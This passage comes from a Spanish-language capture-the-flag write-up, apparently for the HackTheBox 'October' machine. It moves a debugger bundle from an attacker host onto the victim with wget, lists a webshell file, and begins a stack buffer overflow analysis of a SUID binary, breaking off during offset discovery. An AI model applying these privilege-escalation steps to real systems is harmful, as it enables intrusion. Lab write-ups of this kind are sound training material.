-www-data@october:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Para el análisis del binario, vamos a hacer uso de la herramienta &lt;a href=&quot;https://github.com/longld/peda&quot;&gt;peda&lt;/a&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ git clone https://github.com/longld/peda
-Clonando en &lt;span class=&quot;s1&quot;&gt;'peda'&lt;/span&gt;...
-remote: Enumerating objects: 382, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Counting objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9/9&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Compressing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9/9&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-remote: Total 382 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, pack-reused 373
-Recibiendo objetos: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;382/382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 290.84 KiB | 1.21 MiB/s, listo.
-Resolviendo deltas: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;231/231&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, listo.
-❯ &lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-cf&lt;/span&gt; peda.tar peda
-❯ ll
-drwxr-xr-x root root 142 B  Tue Sep 21 00:47:20 2021  peda
-.rw-r--r-- root root  65 B  Mon Sep 20 22:14:52 2021  k4mishell.php5
-.rw-r--r-- root root 660 KB Tue Sep 21 00:47:39 2021  peda.tar
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora le pasamos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;peda.tar&lt;/code&gt; a la máquina víctima.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
-Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
-10.10.10.16 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21/Sep/2021 00:49:51] &lt;span class=&quot;s2&quot;&gt;&quot;GET /peda.tar HTTP/1.1&quot;&lt;/span&gt; 200 -
-^C
-Keyboard interrupt received, exiting.
-❯ 
-❯ &lt;span class=&quot;nb&quot;&gt;md5sum &lt;/span&gt;peda.tar
-0eb8ec6cc2974c84768b1ae816b6bf55  peda.tar
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@october:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://10.10.14.16/peda.tar
-&lt;span class=&quot;nt&quot;&gt;--2021-09-21&lt;/span&gt; 08:54:36--  http://10.10.14.16/peda.tar
-Connecting to 10.10.14.16:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 675840 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;660K&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;application/x-tar]
-Saving to: &lt;span class=&quot;s1&quot;&gt;'peda.tar'&lt;/span&gt;
-
-100%[&lt;span class=&quot;o&quot;&gt;=======================================================================================&amp;gt;]&lt;/span&gt; 675,840      834KB/s   &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.8s   
-
-2021-09-21 08:54:37 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;834 KB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - &lt;span class=&quot;s1&quot;&gt;'peda.tar'&lt;/span&gt; saved &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;675840/675840]
-
-www-data@october:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;md5sum &lt;/span&gt;peda.tar 
-0eb8ec6cc2974c84768b1ae816b6bf55  peda.tar
-www-data@october:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Descomprimimos el archivo transferido:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@october:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xf&lt;/span&gt; peda.tar 
-www-data@october:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 660
-drwxrwxrwt  3 root     root         80 Sep 21 08:56 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 20 root     root        680 Sep 21 08:14 ..
-drwxr-xr-x  4 www-data www-data    200 Sep 21 08:47 peda
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 675840 Sep 21 08:47 peda.tar
-www-data@october:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora instalamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;peda&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@october:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;
-
-www-data@october:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;HOME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/shm
-www-data@october:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;
-/dev/shm
-www-data@october:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;source ~/peda/peda.py&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; ~/.gdbinit
-www-data@october:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 664
-drwxrwxrwt  3 root     root        100 Sep 21 08:59 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 20 root     root        680 Sep 21 08:14 ..
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data     22 Sep 21 08:59 .gdbinit
-drwxr-xr-x  4 www-data www-data    200 Sep 21 08:47 peda
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 www-data www-data 675840 Sep 21 08:47 peda.tar
-www-data@october:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-www-data@october:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb
-GNU gdb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu 7.7.1-0ubuntu5~14.04.2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 7.7.1
-Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2014 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
-This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.  Type &lt;span class=&quot;s2&quot;&gt;&quot;show copying&quot;&lt;/span&gt;
-and &lt;span class=&quot;s2&quot;&gt;&quot;show warranty&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;details.
-This GDB was configured as &lt;span class=&quot;s2&quot;&gt;&quot;i686-linux-gnu&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Type &lt;span class=&quot;s2&quot;&gt;&quot;show configuration&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;configuration details.
-For bug reporting instructions, please see:
-&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.
-Find the GDB manual and other documentation resources online at:
-&amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.
-For &lt;span class=&quot;nb&quot;&gt;help&lt;/span&gt;, &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Type &lt;span class=&quot;s2&quot;&gt;&quot;apropos word&quot;&lt;/span&gt; to search &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;commands related to &lt;span class=&quot;s2&quot;&gt;&quot;word&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Procedemos al análisis del binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/local/bin/ovrflw&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@october:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb /usr/local/bin/ovrflw &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt;
-Reading symbols from /usr/local/bin/ovrflw...&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no debugging symbols found&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;...done.
-gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;     
-gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;checksec
-CANARY    : disabled
-FORTIFY   : disabled
-NX        : ENABLED
-PIE       : disabled
-RELRO     : Partial
-gdb-peda&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;info functions                                                                                                         
-All defined functions:                                                                                                           
-
-Non-debugging symbols:
-0x080482f4  _init
-0x08048330  &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@plt
-0x08048340  strcpy@plt
-0x08048350  __gmon_start__@plt
-0x08048360  &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;@plt
-0x08048370  __libc_start_main@plt
-0x08048380  _start
-0x080483b0  __x86.get_pc_thunk.bx
-0x080483c0  deregister_tm_clones 
-0x080483f0  register_tm_clones
-0x08048430  __do_global_dtors_aux
-0x08048450  frame_dummy
-0x0804847d  main
-0x080484d0  __libc_csu_init
-0x08048540  __libc_csu_fini
-0x08048544  _fini
-gdb-peda&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;disass main
-Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;main:
-   0x0804847d &amp;lt;+0&amp;gt;:     push   ebp
-   0x0804847e &amp;lt;+1&amp;gt;:     mov    ebp,esp
-   0x08048480 &amp;lt;+3&amp;gt;:     and    esp,0xfffffff0
-   0x08048483 &amp;lt;+6&amp;gt;:     add    esp,0xffffff80
-   0x08048486 &amp;lt;+9&amp;gt;:     cmp    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp+0x8],0x1
-   0x0804848a &amp;lt;+13&amp;gt;:    jg     0x80484ad &amp;lt;main+48&amp;gt;
-   0x0804848c &amp;lt;+15&amp;gt;:    mov    eax,DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp+0xc]
-   0x0804848f &amp;lt;+18&amp;gt;:    mov    eax,DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;eax]
-   0x08048491 &amp;lt;+20&amp;gt;:    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp+0x4],eax
-   0x08048495 &amp;lt;+24&amp;gt;:    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],0x8048560
-   0x0804849c &amp;lt;+31&amp;gt;:    call   0x8048330 &amp;lt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@plt&amp;gt;
-   0x080484a1 &amp;lt;+36&amp;gt;:    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],0x0
-   0x080484a8 &amp;lt;+43&amp;gt;:    call   0x8048360 &amp;lt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;@plt&amp;gt;
-   0x080484ad &amp;lt;+48&amp;gt;:    mov    eax,DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp+0xc]
-   0x080484b0 &amp;lt;+51&amp;gt;:    add    eax,0x4
-   0x080484b3 &amp;lt;+54&amp;gt;:    mov    eax,DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;eax]
-   0x080484b5 &amp;lt;+56&amp;gt;:    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp+0x4],eax
-   0x080484b9 &amp;lt;+60&amp;gt;:    lea    eax,[esp+0x1c]
-   0x080484bd &amp;lt;+64&amp;gt;:    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],eax
-   0x080484c0 &amp;lt;+67&amp;gt;:    call   0x8048340 &amp;lt;strcpy@plt&amp;gt;
-   0x080484c5 &amp;lt;+72&amp;gt;:    mov    eax,0x0
-   0x080484ca &amp;lt;+77&amp;gt;:    leave  
-   0x080484cb &amp;lt;+78&amp;gt;:    ret    
-End of assembler dump.
-gdb-peda&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que se encuentra habilitado &lt;strong&gt;&lt;em&gt;NX&lt;/em&gt;&lt;/strong&gt;, el cual es como el &lt;strong&gt;&lt;em&gt;DEP (Data Execution Prevention)&lt;/em&gt;&lt;/strong&gt; de Windows que impide que una aplicación o servicio se ejecute desde una región de memoria no ejecutable; por lo tanto, no podemos cargar nuestro payload malicioso porque no se nos va a interpretar.&lt;/p&gt;
-
-&lt;p&gt;Además vemos el uso de la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strcpy&lt;/code&gt; el cual en caso de no estar sanitizada la entrada del usuario, puede ocacionar un buffer overflow. Esto lo podemos ver ejecutando el programa desde &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;peda&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;r &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'print &quot;A&quot;*500'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;                                                                                         
-Starting program: /usr/local/bin/ovrflw &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'print &quot;A&quot;*500'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;                                                             
-                                                                                                                                 
-Program received signal SIGSEGV, Segmentation fault.                                                                             
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;----------------------------------registers-----------------------------------&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;                                                 
-EAX: 0x0 
-EBX: 0xb7756000 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0x1abda8 
-ECX: 0xbfc83e70 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'A'&lt;/span&gt; &amp;lt;repeats 13 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;)&lt;/span&gt;
-EDX: 0xbfc82a43 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'A'&lt;/span&gt; &amp;lt;repeats 13 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;)&lt;/span&gt;
-ESI: 0x0 
-EDI: 0x0 
-EBP: 0x41414141 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'AAAA'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-ESP: 0xbfc828d0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'A'&lt;/span&gt; &amp;lt;repeats 200 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-EIP: 0x41414141 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'AAAA'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-EFLAGS: 0x10202 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;carry parity adjust zero sign &lt;span class=&quot;nb&quot;&gt;trap &lt;/span&gt;INTERRUPT direction overflow&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-------------------------------------code-------------------------------------&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
-Invalid &lt;span class=&quot;nv&quot;&gt;$PC&lt;/span&gt; address: 0x41414141
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;------------------------------------stack-------------------------------------&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
-0000| 0xbfc828d0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'A'&lt;/span&gt; &amp;lt;repeats 200 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-0004| 0xbfc828d4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'A'&lt;/span&gt; &amp;lt;repeats 200 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-0008| 0xbfc828d8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'A'&lt;/span&gt; &amp;lt;repeats 200 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-0012| 0xbfc828dc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'A'&lt;/span&gt; &amp;lt;repeats 200 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-0016| 0xbfc828e0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'A'&lt;/span&gt; &amp;lt;repeats 200 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-0020| 0xbfc828e4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'A'&lt;/span&gt; &amp;lt;repeats 200 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-0024| 0xbfc828e8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'A'&lt;/span&gt; &amp;lt;repeats 200 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-0028| 0xbfc828ec &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'A'&lt;/span&gt; &amp;lt;repeats 200 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
-Legend: code, data, rodata, value
-Stopped reason: SIGSEGV
-0x41414141 &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; ?? &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-gdb-peda&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;i r
-eax            0x0      0x0
-ecx            0xbf9c4e70       0xbf9c4e70
-edx            0xbf9c3bf3       0xbf9c3bf3
-ebx            0xb76f0000       0xb76f0000
-esp            0xbf9c3a80       0xbf9c3a80
-ebp            0x41414141       0x41414141
-esi            0x0      0x0
-edi            0x0      0x0
-eip            0x41414141       0x41414141
-eflags         0x10202  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; IF RF &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
-cs             0x73     0x73
-ss             0x7b     0x7b
-ds             0x7b     0x7b
-es             0x7b     0x7b
-fs             0x0      0x0
-gs             0x33     0x33
-gdb-peda&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Como podemos ver, el programa nos manda la leyenda &lt;em&gt;Segmentation fault&lt;/em&gt; y vemos que los registros &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eip&lt;/code&gt; han cambiado su valor por la cadena que le introducimos “&lt;em&gt;A - (0x41)&lt;/em&gt;”. Por lo tanto, necesitamos saber cual es el límite antes de cambiar los registros; ésto lo podemos lograr con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pattern_create&lt;/code&gt; desde &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;peda&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;pattern_create 500
-&lt;span class=&quot;s1&quot;&gt;'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'&lt;/span&gt;
-gdb-peda&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora copiamos la cadena obtenida y la pasamos como argumento:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;r &lt;span class=&quot;s1&quot;&gt;'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8A
-ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A
-%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA
-%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'&lt;/span&gt;  
-Starting program: /usr/local/bin/ovrflw &lt;span class=&quot;s1&quot;&gt;'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5
-AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%n
-A%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%R
